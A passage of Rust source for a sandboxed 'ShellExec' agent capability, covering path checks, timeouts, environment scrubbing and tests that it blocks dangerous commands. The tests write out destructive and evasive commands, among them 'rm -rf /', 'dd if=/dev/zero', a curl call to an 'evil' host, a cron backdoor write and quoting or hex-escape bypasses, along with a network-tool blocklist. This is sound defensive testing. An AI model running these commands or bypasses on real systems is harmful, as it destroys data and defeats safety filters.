            && (path_without_redirect.starts_with('/') || path_without_redirect.starts_with("~/"))
        {
            path_without_redirect
        } else {
            path
        };

        // Skip shell variable assignments: VAR=value
        if path.contains('=') && !path.starts_with('/') && !path.starts_with("~/") {
            continue;
        }

        // ── GAP-08: Expand $VAR and ${VAR} references ──
        // Shell variables like $HOME/.ssh/id_ed25519 don't start with /
        // or ~/, so they'd normally be skipped. Expand them against the
        // current environment and check the resolved path.
        let resolved = if path.contains('$') {
            let expanded = expand_shell_vars(path);
            if expanded == path {
                // No variables were expanded; token might just contain
                // a literal $ that isn't a var reference. Skip.
                continue;
            }
            // After expansion, check if the resolved path is absolute
            if expanded.starts_with('/') {
                // Strip trailing shell operators
                let clean = expanded.trim_end_matches(|c: char| {
                    c == ';' || c == '|' || c == '&' || c == '>' || c == '<'
                });
                clean.to_string()
            } else {
                // Expanded but not absolute — skip (e.g., echo $VAR)
                continue;
            }
        } else if path.starts_with("~/") {
            match std::env::var("HOME") {
                Ok(home) => {
                    let mut home_path = home.trim_end_matches('/').to_string();
                    home_path.push_str(&path[1..]); // path[1..] = "/rest/of/path"
                    home_path
                }
                Err(_) => continue, // skip if HOME is unset (rare)
            }
        } else if path.starts_with('/') {
            // Strip trailing shell operators: semicolon, pipe, redirect, ampersand
            // e.g. "/etc/passwd;" → "/etc/passwd"
            let clean_end = path.trim_end_matches(|c: char| {
                c == ';' || c == '|' || c == '&' || c == '>' || c == '<'
            });
            clean_end.to_string()
        } else if path.starts_with('.') {
            // ── GAP-13: Resolve relative paths against CWD ──
            // `../../etc/passwd` from /tmp resolves to /etc/passwd.
            // Normalize the path (join with CWD, resolve ".." and ".")
            // without requiring filesystem existence.
            let Ok(cwd) = std::env::current_dir() else {
                continue;
            };
            let joined = cwd.join(path);
            // Normalize: remove "." and resolve ".." components
            let mut components: Vec<&str> = Vec::new();
            for component in joined.components() {
                match component {
                    std::path::Component::ParentDir => {
                        components.pop(); // go up one level
                    }
                    std::path::Component::Normal(os_str) => {
                        if let Some(s) = os_str.to_str() {
                            components.push(s);
                        }
                    }
                    std::path::Component::RootDir => {
                        // Start fresh from root
                        components.clear();
                    }
                    // CurDir, Prefix — no effect
                    _ => {}
                }
            }
            let normalized = format!("/{}", components.join("/"));
            // Reject if the normalized path contains ".." (couldn't fully resolve)
            if normalized.contains("/../") || normalized.contains("/..") || normalized == "/.." {
                return Some(format!(
                    "ShellExec blocked: path traversal not allowed: {}",
                    path
                ));
            }
            normalized
        } else {
            continue;
        };

        // Skip if it's just "/" (root — handled by the blocklist)
        if resolved == "/" {
            continue;
        }

        // Reject paths containing ".." traversal (prevents prefix-bypass
        // via parent traversal: /home/user/../../etc/passwd)
        if resolved.contains("/../") || resolved.contains("/..") || resolved == ".." {
            return Some(format!(
                "ShellExec blocked: path traversal not allowed: {}",
                path
            ));
        }

        // Skip device paths (handled by blocklist: dd, mkfs)
        if resolved.starts_with("/dev/") {
            continue;
        }

        // Skip proc/sys filesystem (handled by blocklist)
        if resolved.starts_with("/proc/") || resolved.starts_with("/sys/") {
            continue;
        }

        if !is_path_within_allowed(&resolved, &allowed) {
            // Don't leak the actual resolved HOME path in error messages
            let display_path = if path.starts_with("~/") {
                path.to_string()
            } else {
                resolved
            };
            return Some(format!(
                "ShellExec blocked: path is outside allowed directories: {}",
                display_path
            ));
        }
    }

    None
}

#[allow(clippy::arithmetic_side_effects)] // -(pgid) negation is safe for valid PIDs
fn wait_with_timeout(child: &mut Child, pgid: u32, timeout_secs: u64) -> WaitResult {
    let start = Instant::now();
    let timeout = Duration::from_secs(timeout_secs);
    let child_pid = child.id();
    let stdout_thread = child.stdout.take().map(|stdout| {
        thread::spawn(move || {
            let mut data = Vec::new();
            let _ = stdout.take(MAX_OUTPUT_BYTES as u64).read_to_end(&mut data);
            data
        })
    });
    let stderr_thread = child.stderr.take().map(|stderr| {
        thread::spawn(move || {
            let mut data = Vec::new();
            let _ = stderr.take(MAX_OUTPUT_BYTES as u64).read_to_end(&mut data);
            data
        })
    });
    let mut last_descendants: Vec<u32>;
    loop {
        if start.elapsed() > timeout {
            // SAFETY: pgid is a valid process group ID from the spawned child; SIGKILL is well-defined;
            // pgid as pid_t may wrap on 32-bit but pgid is always within pid_t range
            #[allow(clippy::cast_possible_wrap)]
            unsafe {
                let _ = libc::kill(-(pgid as libc::pid_t), libc::SIGKILL);
            }
            let killed_descendants = get_all_descendants(child_pid);
            let _ = child.wait();
            let _ = stdout_thread.map(|h| h.join().unwrap_or_default());
            let _ = stderr_thread.map(|h| h.join().unwrap_or_default());
            return Err(Error::ExecutionFailed(format!(
                "command timed out after {}s (killed {} descendants)",
                timeout_secs,
                killed_descendants.len()
            )));
        }
        last_descendants = get_all_descendants(child_pid);
        match child.try_wait() {
            Ok(Some(status)) => {
                let stdout_data = stdout_thread
                    .map(|h| h.join().unwrap_or_default())
                    .unwrap_or_default();
                let stderr_data = stderr_thread
                    .map(|h| h.join().unwrap_or_default())
                    .unwrap_or_default();
                return Ok((status, stdout_data, stderr_data, last_descendants));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(50)),
            Err(e) => return Err(Error::ExecutionFailed(format!("error waiting: {}", e))),
        }
    }
}

fn get_direct_children(pid: u32) -> Vec<u32> {
    let children_path = format!("/proc/{}/children", pid);
    if let Ok(content) = fs::read_to_string(&children_path) {
        content
            .split_whitespace()
            .filter_map(|s| s.parse::<u32>().ok())
            .collect()
    } else {
        Vec::new()
    }
}

fn get_all_descendants(pid: u32) -> Vec<u32> {
    let mut descendants = Vec::new();
    let mut stack = vec![pid];
    let mut visited = std::collections::HashSet::new();
    while let Some(current) = stack.pop() {
        if visited.contains(&current) {
            continue;
        }
        visited.insert(current);
        let children = get_direct_children(current);
        if children.is_empty() {
            if let Ok(output) = std::process::Command::new("pgrep")
                .arg("-P")
                .arg(current.to_string())
                .output()
            {
                if output.status.success() {
                    let pgrep_lines = String::from_utf8_lossy(&output.stdout).to_string();
                    let pgrep_children = pgrep_lines
                        .lines()
                        .filter_map(|s| s.trim().parse::<u32>().ok());
                    for child in pgrep_children {
                        if !visited.contains(&child) {
                            descendants.push(child);
                            stack.push(child);
                        }
                    }
                    continue;
                }
            }
        }
        for child in children {
            if !visited.contains(&child) {
                descendants.push(child);
                stack.push(child);
            }
        }
    }
    descendants
}

/// Capability that executes shell commands with safety guards.
///
/// Commands are run in the executor's process group with a configurable
/// timeout. A blocklist rejects destructive commands (e.g. `rm -rf /`,
/// `dd if=/dev/zero of=/dev/sda`). All executions are logged to the WAL.
#[allow(clippy::exhaustive_structs)]
pub struct ShellExec;

impl TypedCapability for ShellExec {
    type Args = ShellExecArgs;

    fn name(&self) -> &'static str {
        "ShellExec"
    }
    fn description(&self) -> &'static str {
        "execute shell command via sh -c with timeout, audit trail, detokenized blocklist, path restrictions, env sanitization, and PID tracking. blocks: rm, shred, mkfs, fdisk, dd, shutdown, chown, chmod, kill, mount, iptables, interpreters (opt-in), network tools (opt-in), fork bombs, env dumpers."
    }
    fn schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "cmd": { "type": "string", "description": "Command to execute via sh -c (max 65536 bytes)", "minLength": 1, "maxLength": 65536 },
                "timeout_secs": { "type": "integer", "minimum": 1, "maximum": 300 },
                "cwd": { "type": "string" },
                "stdin": { "type": "string" }
            },
            "required": ["cmd"]
        })
    }
    fn execute(
        &self,
        args: ShellExecArgs,
        ctx: &Context,
    ) -> std::result::Result<Output, CapabilityError> {
        // Timeout from JSON args, falling back to default
        // Enforce range: minimum 1, maximum 300 (matching schema declaration)
        if let Some(secs) = args.timeout_secs {
            if !(1..=300).contains(&secs) {
                return Err(CapabilityError::InvalidArgs(format!(
                    "timeout_secs must be between 1 and 300, got {}",
                    secs
                )));
            }
        }
        let timeout = args.timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);

        let max_cmd_len: usize = 65536;

        // Reject empty or whitespace-only commands
        if args.cmd.trim().is_empty() {
            return Err(CapabilityError::InvalidArgs(
                "command is empty or contains only whitespace".into(),
            ));
        }

        // Enforce maximum command length (prevent oversized CLI args)
        if args.cmd.len() > max_cmd_len {
            return Err(CapabilityError::InvalidArgs(format!(
                "command too long ({} bytes, max {})",
                args.cmd.len(),
                max_cmd_len
            )));
        }

        // F-013: Blocklist check (original + detokenized) — runs BEFORE dry_run
        // so dangerous commands are rejected even in dry-run mode (F-017).
        if let Some(reason) = is_dangerous_command(&args.cmd) {
            return Err(CapabilityError::PermissionDenied(format!(
                "dangerous command blocked: {}",
                reason
            )));
        }

        // F-015: Block env-dumping commands (checked in is_dangerous_command
        // but also here as defense-in-depth in case the blocklist evolves)
        if !network_enabled() && is_network_command(&args.cmd) {
            return Err(CapabilityError::PermissionDenied(
                "network commands blocked — set RUNTIMO_ENABLE_NETWORK=1 to enable".into(),
            ));
        }

        // N-009: Block interpreter commands (checked in is_dangerous_command
        // would be redundant — interpreters are not "dangerous" in the blocklist
        // sense, they are gated capabilities. This is the gating layer.)
        if !interpreters_enabled() && is_interpreter_command(&args.cmd) {
            return Err(CapabilityError::PermissionDenied(
                "interpreter commands blocked — set RUNTIMO_ENABLE_INTERPRETERS=1 to enable".into(),
            ));
        }

        // F-014: Path restriction check — scan for paths outside allowed prefixes
        if let Some(reason) = check_command_paths(&args.cmd) {
            return Err(CapabilityError::PermissionDenied(reason));
        }

        // Dry-run check AFTER security validation — ensures dangerous commands
        // are blocked even in dry-run mode (F-017: dry_run must not bypass security)
        if ctx.dry_run {
            let mut out = Output::ok("DRY RUN".into());
            out.data = Some(serde_json::json!({ "cmd": &args.cmd, "dry_run": true }));
            return Ok(out);
        }

        let mut cmd = Command::new("sh");
        // PATH sanitization: limit executable resolution to trusted system dirs.
        // This is defense-in-depth — the blocklist catches known-dangerous
        // commands, but this prevents invocation of custom binaries in
        // non-standard locations.
        cmd.env("PATH", "/usr/local/bin:/usr/bin:/bin");

        // F-015: Sanitized environment — strip sensitive env vars before spawning.
        // Only safe system variables survive; secrets (API keys, tokens, passwords)
        // are removed. RUNTIMO_ENABLE_NETWORK is explicitly preserved in the safe list.
        let safe_env = sanitized_env();
        for (key, value) in &safe_env {
            // PATH is set explicitly above; skip to avoid duplicate
            if key == "PATH" {
                continue;
            }
            cmd.env(key, value);
        }

        cmd.arg("-c").arg(&args.cmd);
        if let Some(cwd) = &args.cwd {
            let path_ctx = PathContext {
                require_exists: true,
                require_file: false,
                ..Default::default()
            };
            let cwd_path = validate_path(cwd, &path_ctx)
                .map_err(|e| CapabilityError::PermissionDenied(format!("invalid cwd: {}", e)))?;
            cmd.current_dir(cwd_path);
        }
        let mut child = cmd
            .process_group(0)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .stdin(if args.stdin.is_some() {
                std::process::Stdio::piped()
            } else {
                std::process::Stdio::null()
            })
            .spawn()
            .map_err(|e| {
                CapabilityError::Io(std::io::Error::other(format!("failed to spawn: {}", e)))
            })?;
        let child_pid = child.id();
        let pgid = child_pid;
        if let Some(ref stdin_content) = args.stdin {
            if stdin_content.len() > MAX_STDIN_BYTES {
                return Err(CapabilityError::InvalidArgs("stdin too large".into()));
            }
            if let Some(mut stdin_pipe) = child.stdin.take() {
                let _ = stdin_pipe.write_all(stdin_content.as_bytes());
            }
        }
        let (exit_status, stdout, stderr, _descendants) =
            wait_with_timeout(&mut child, pgid, timeout)
                .map_err(|e| CapabilityError::Internal(e.to_string()))?;
        let stdout_str = String::from_utf8_lossy(&stdout).to_string();
        let stderr_str = String::from_utf8_lossy(&stderr).to_string();
        let success = exit_status.success();

        let mut out = if success {
            Output::ok("completed".into())
        } else {
            Output::error(
                format!("exit code {}", exit_status.code().unwrap_or(-1)),
                format!("exit code {}", exit_status.code().unwrap_or(-1)),
            )
        };
        out.data = Some(
            serde_json::json!({ "cmd": &args.cmd, "stdout": stdout_str, "stderr": stderr_str, "exit_code": exit_status.code().unwrap_or(-1), "pid": child_pid, "timeout_secs": timeout, "timed_out": exit_status.code().is_none(), "truncated": stdout.len() >= MAX_OUTPUT_BYTES || stderr.len() >= MAX_OUTPUT_BYTES }),
        );
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::capability::Capability;
    use std::time::Instant;
    #[test]
    fn executes_uptime() {
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "uptime"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap();
        assert_eq!(r.status, "ok");
    }
    #[test]
    fn pipes_work() {
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo hi | cat"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap();
        assert_eq!(r.status, "ok");
        assert!(r.data.as_ref().unwrap()["stdout"]
            .as_str()
            .unwrap()
            .contains("hi"));
    }
    #[test]
    fn chaining_works() {
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo a && echo b"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap();
        assert_eq!(r.status, "ok");
    }
    #[test]
    fn blocks_dangerous() {
        assert!(Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "mkfs"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            }
        )
        .is_err());
    }
    #[test]
    fn blocks_recursive_flag() {
        // rm --recursive (long form) should be caught like -rf
        assert!(Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "rm --recursive /home"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            }
        )
        .is_err());
    }
    #[test]
    fn blocks_rm_rf_root() {
        // rm -rf / should always be blocked regardless of context
        assert!(Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "rm -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            }
        )
        .is_err());
    }
    #[test]
    fn blocks_rm_no_preserve_root() {
        assert!(Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "rm --no-preserve-root -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            }
        )
        .is_err());
    }
    #[test]
    fn blocks_ownership_commands() {
        for cmd in &["chown root /tmp/x", "chgrp staff /tmp/x"] {
            assert!(
                Capability::execute(
                    &ShellExec,
                    &serde_json::json!({"cmd": cmd}),
                    &Context {
                        dry_run: false,
                        job_id: "test".into(),
                        working_dir: std::env::temp_dir(),
                    }
                )
                .is_err(),
                "should block: {}",
                cmd
            );
        }
    }
    #[test]
    fn blocks_mount_commands() {
        for cmd in &["mount /dev/sda1 /mnt", "umount /mnt"] {
            assert!(
                Capability::execute(
                    &ShellExec,
                    &serde_json::json!({"cmd": cmd}),
                    &Context {
                        dry_run: false,
                        job_id: "test".into(),
                        working_dir: std::env::temp_dir(),
                    }
                )
                .is_err(),
                "should block: {}",
                cmd
            );
        }
    }
    #[test]
    fn blocks_firewall_commands() {
        for cmd in &["iptables -L", "nft list ruleset"] {
            assert!(
                Capability::execute(
                    &ShellExec,
                    &serde_json::json!({"cmd": cmd}),
                    &Context {
                        dry_run: false,
                        job_id: "test".into(),
                        working_dir: std::env::temp_dir(),
                    }
                )
                .is_err(),
                "should block: {}",
                cmd
            );
        }
    }
    #[test]
    fn blocks_network_commands_by_default() {
        // Ensure RUNTIMO_ENABLE_NETWORK is not set
        std::env::remove_var("RUNTIMO_ENABLE_NETWORK");
        for cmd in &[
            "curl http://example.com",
            "wget http://example.com",
            "nc example.com 80",
        ] {
            assert!(
                Capability::execute(
                    &ShellExec,
                    &serde_json::json!({"cmd": cmd}),
                    &Context {
                        dry_run: false,
                        job_id: "test".into(),
                        working_dir: std::env::temp_dir(),
                    }
                )
                .is_err(),
                "should block network cmd: {}",
                cmd
            );
        }
    }
    #[test]
    fn allows_network_commands_when_enabled() {
        std::env::set_var("RUNTIMO_ENABLE_NETWORK", "1");
        // curl --version should work (non-destructive)
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "curl --version"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        );
        std::env::remove_var("RUNTIMO_ENABLE_NETWORK");
        // May fail if curl not installed, but should NOT fail with "network commands blocked"
        match r {
            Ok(o) => assert_eq!(o.status, "ok", "curl --version should succeed when enabled"),
            Err(e) => {
                let msg = e.to_string();
                assert!(
                    !msg.contains("network commands blocked"),
                    "should NOT block network when RUNTIMO_ENABLE_NETWORK=1, got: {}",
                    msg
                );
            }
        }
    }
    #[test]
    fn enforces_timeout() {
        let s = Instant::now();
        assert!(Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "sleep 5", "timeout_secs": 1}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            }
        )
        .is_err());
        assert!(s.elapsed().as_secs() < 3);
    }

    #[test]
    fn blocks_eval_builtin() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "eval \"echo hello\""}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            err.to_string().contains("shell builtins"),
            "eval should be blocked: {}",
            err
        );
    }

    #[test]
    fn blocks_exec_builtin() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "exec /bin/sh"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            err.to_string().contains("shell builtins"),
            "exec should be blocked: {}",
            err
        );
    }

    #[test]
    fn blocks_source_builtin() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "source /tmp/malicious.sh"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            err.to_string().contains("shell builtins"),
            "source should be blocked: {}",
            err
        );
    }

    #[test]
    fn blocks_dot_sourcing() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": ". /tmp/malicious.sh"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            err.to_string().contains("shell builtins"),
            ". (dot) sourcing should be blocked: {}",
            err
        );
    }

    // ── F-013: Detokenizer + Shell Quoting Bypass Tests ─────────────────

    // ── GAP-01: ANSI-C quoting ($'...') tests ──────────────────────────

    #[test]
    fn detokenize_ansi_c_tab_expansion() {
        // $'rm\t-rf\t/' → ANSI-C expands \t to tab, which we convert to space
        let detok = detokenize_command("$'rm\\t-rf\\t/'");
        // After ANSI-C expansion: rm -rf / (with spaces where tabs were)
        assert!(detok.contains("rm"));
        assert!(detok.contains("-rf"));
        assert!(detok.contains('/'));
    }

    #[test]
    fn detokenize_ansi_c_plain_content() {
        // $'rm -rf /' → rm -rf / (plain content, no escapes)
        let detok = detokenize_command("$'rm -rf /'");
        assert!(detok.contains("rm -rf /"));
    }

    #[test]
    fn detokenize_ansi_c_hex_escape() {
        // $'\x72\x6d' → rm (hex escape for each character)
        let detok = detokenize_command("$'\\x72\\x6d'");
        assert!(
            detok.contains("rm"),
            "Hex-encoded 'rm' should decode, got: {:?}",
            detok
        );
    }

    #[test]
    fn detokenize_ansi_c_unicode_escape() {
        // $'\u0072\u006d' → rm (unicode escape for each character)
        let detok = detokenize_command("$'\\u0072\\u006d'");
        assert!(
            detok.contains("rm"),
            "Unicode-encoded 'rm' should decode, got: {:?}",
            detok
        );
    }

    #[test]
    fn detokenize_ansi_c_octal_escape() {
        // $'\162\155' → rm (octal: 162=0x72='r', 155=0x6d='m')
        let detok = detokenize_command("$'\\162\\155'");
        assert!(
            detok.contains("rm"),
            "Octal-encoded 'rm' should decode, got: {:?}",
            detok
        );
    }

    #[test]
    fn detokenize_ansi_c_newline_expansion() {
        // $'rm\n-rf\n/' → newline becomes space for token visibility
        let detok = detokenize_command("$'rm\\n-rf\\n/'");
        assert!(detok.contains("rm"));
        assert!(detok.contains("-rf"));
    }

    #[test]
    fn detokenize_ansi_c_combined_escapes() {
        // $'m\\x6bfs' → mkfs (literal m + hex k + literal fs)
        let detok = detokenize_command("$'m\\x6bfs'");
        assert!(
            detok.contains("mkfs"),
            "Should decode to mkfs, got: {:?}",
            detok
        );
    }

    #[test]
    fn blocks_rm_via_ansi_c_bypass() {
        // GAP-01: $'rm\t-rf\t/' should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "$'rm\\t-rf\\t/'"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        let msg = format!("{}", err);
        assert!(
            msg.contains("recursive rm") || msg.contains("dangerous command blocked"),
            "Should block ANSI-C quoted rm, got: {}",
            msg
        );
    }

    #[test]
    fn blocks_rm_via_ansi_c_hex_bypass() {
        // GAP-06: $'\x72\x6d' -rf / should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "$'\\x72\\x6d' -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("recursive rm")
                || format!("{}", err).contains("rm command blocked"),
            "Should block hex-encoded rm bypass"
        );
    }

    // ── GAP-14: chmod quoting bypass test ──────────────────────────────

    #[test]
    fn blocks_chmod_via_quote_bypass() {
        // c"hmod" 777 / should be blocked (detokenized to chmod 777 /)
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "c\"hmod\" 777 /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("chmod"),
            "Should block c\"hmod\" 777 / (quoted chmod bypass)"
        );
    }

    // ── Original detokenizer tests ──────────────────────────────────────

    // ── GAP-02: Multi-pass + backslash-newline tests ───────────────────

    #[test]
    fn detokenize_backslash_newline_continuation() {
        // r\<newline>m -rf / → should join as rm -rf /
        let cmd_with_newline = "r\\\nm -rf /";
        let detok = detokenize_command(cmd_with_newline);
        assert!(
            detok.contains("rm"),
            "Backslash-newline should be stripped, got: {:?}",
            detok
        );
        assert!(
            detok.contains("rm -rf /"),
            "Should rejoin tokens across newline, got: {:?}",
            detok
        );
    }

    #[test]
    fn blocks_rm_via_backslash_newline_bypass() {
        // GAP-02: r\<newline>m -rf / should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "r\\\nm -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("recursive rm")
                || format!("{}", err).contains("rm command blocked"),
            "Should block backslash-newline rm bypass"
        );
    }

    #[test]
    fn detokenize_multi_pass_stability() {
        // Triple-nested quotes should be fully stripped
        let detok = detokenize_command("\"'rm'\" -rf /");
        // After multi-pass: 'rm' → rm (single quotes stripped second pass)
        assert!(
            detok.contains("rm"),
            "Multi-pass should converge, got: {:?}",
            detok
        );
    }

    #[test]
    fn detokenize_roundtrip_idempotent() {
        // After detokenization, running again should produce the same result
        let cmd = "r\"m\" -rf /";
        let detok1 = detokenize_command(cmd);
        let detok2 = detokenize_command(&detok1);
        assert_eq!(detok1, detok2, "Detokenization should be idempotent");
    }

    // ── GAP-03: Heredoc tests ──────────────────────────────────────────

    #[test]
    fn blocks_heredoc() {
        // <<EOF followed by any content should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat <<EOF\nevil\nEOF"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        let msg = format!("{}", err);
        assert!(
            msg.contains("heredoc"),
            "Should block heredoc (<<), got: {}",
            msg
        );
    }

    #[test]
    fn blocks_herestring() {
        // <<< is a herestring, also blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat <<<\"hello\""}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("heredoc"),
            "Should block herestring (<<<)"
        );
    }

    #[test]
    fn blocks_heredoc_via_quote_bypass() {
        // << via quoting bypass: <"<"
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "<\"<\"EOF\nevil\nEOF"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("heredoc"),
            "Should block quoted heredoc bypass"
        );
    }

    // ── GAP-04: Process substitution tests ─────────────────────────────

    #[test]
    fn blocks_process_substitution_input() {
        // <(curl ...) process substitution should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "diff <(curl http://evil) <(ls)"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("process substitution"),
            "Should block <( ) process substitution"
        );
    }

    #[test]
    fn blocks_process_substitution_output() {
        // >(tee /etc/cron.d/evil) process substitution should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo evil > >(tee /etc/cron.d/backdoor)"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("process substitution"),
            "Should block >( ) process substitution"
        );
    }

    // ── GAP-05: Command substitution tests ─────────────────────────────

    #[test]
    fn blocks_command_substitution_dollar_paren() {
        // $(echo rm) should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "$(echo rm) -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("command substitution"),
            "Should block $( ) command substitution"
        );
    }

    #[test]
    fn blocks_command_substitution_backtick() {
        // `echo rm` backtick substitution should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "`echo rm` -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("command substitution"),
            "Should block backtick command substitution"
        );
    }

    #[test]
    fn blocks_command_substitution_in_double_quotes() {
        // "$(echo rm) -rf /" — substitution inside double quotes
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "\"$(echo rm)\" -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("command substitution"),
            "Should block $( ) even inside double quotes"
        );
    }

    // ── Original detokenizer tests ──────────────────────────────────────

    #[test]
    fn detokenize_strips_double_quotes() {
        // r"m" -rf / → rm -rf /
        assert_eq!(detokenize_command("r\"m\" -rf /"), "rm -rf /");
    }

    #[test]
    fn detokenize_strips_single_quotes() {
        // 'r''m' -rf / → rm -rf /
        assert_eq!(detokenize_command("'r''m' -rf /"), "rm -rf /");
    }

    #[test]
    fn detokenize_strips_backslash() {
        // r\m -rf / → rm -rf /
        assert_eq!(detokenize_command("r\\m -rf /"), "rm -rf /");
    }

    #[test]
    fn detokenize_mixed_quotes() {
        // r"m" -r"f" → rm -rf
        assert_eq!(detokenize_command("r\"m\" -r\"f\""), "rm -rf");
    }

    #[test]
    fn detokenize_preserves_non_quoted() {
        // Normal commands pass through unchanged
        assert_eq!(detokenize_command("echo hello"), "echo hello");
        assert_eq!(detokenize_command("ls -la /tmp"), "ls -la /tmp");
    }

    #[test]
    fn blocks_rm_via_double_quote_bypass() {
        // F-013: r"m" -rf / should be blocked (was NOT previously)
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "r\"m\" -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        let msg = format!("{}", err);
        assert!(
            msg.contains("dangerous command blocked") || msg.contains("recursive rm"),
            "Should block r\"m\" -rf /, got: {}",
            msg
        );
    }

    #[test]
    fn blocks_rm_via_single_quote_bypass() {
        // F-013: 'r''m' -rf / should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "'r''m' -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("recursive rm")
                || format!("{}", err).contains("rm command blocked"),
            "Should block 'r''m' -rf /"
        );
    }

    #[test]
    fn blocks_rm_via_backslash_bypass() {
        // F-013: r\m -rf / should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "r\\m -rf /"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("recursive rm")
                || format!("{}", err).contains("rm command blocked"),
            "Should block r\\m -rf /"
        );
    }

    #[test]
    fn blocks_dd_via_quote_bypass() {
        // F-013: d"d" if=/dev/zero should be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "d\"d\" if=/dev/zero"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
